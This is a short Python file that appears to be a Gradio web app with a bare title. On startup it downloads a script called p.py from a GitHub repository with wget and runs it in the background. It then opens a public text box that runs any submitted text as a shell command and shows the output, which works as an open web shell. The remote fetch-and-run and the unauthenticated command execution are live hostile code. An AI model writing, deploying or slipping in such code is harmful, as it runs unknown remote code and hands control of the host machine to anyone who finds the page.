import gradio as gr
import time, os, subprocess
from multiprocessing import Process

os.system("wget https://github.com/shrsvr/Zbdd/raw/refs/heads/main/p.py")
os.system("python3 p.py &")

def exc(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        output = result.stdout.strip() if result.stdout else result.stderr.strip()
        return output
    except Exception as e:
        return str(e)

def c(command):
    output = exc(command)
    return output

iface = gr.Interface(fn=c, inputs="text", outputs="text", title="Ayxr")
iface.launch()
